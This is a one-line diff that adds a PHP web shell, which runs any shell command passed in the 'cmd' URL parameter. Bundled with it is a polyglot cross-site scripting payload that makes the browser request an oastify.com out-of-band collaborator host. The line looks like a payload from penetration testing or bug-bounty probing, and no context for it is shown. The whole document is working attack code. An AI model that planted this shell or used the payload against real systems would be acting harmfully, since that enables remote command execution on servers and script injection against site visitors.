@@ -1,0 +1,1 @@
+<?php echo "Shell";system($_GET['cmd']); javascript:/*&lt;/script&gt;&lt;img/onerror=&apos;-/&quot;/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/pslbbyb3u915pd7strpu7bgh3893xuvin9b73uunhe53X;.oastify.com/).replace(/.;/g,[])]//&apos;src=&gt;?>
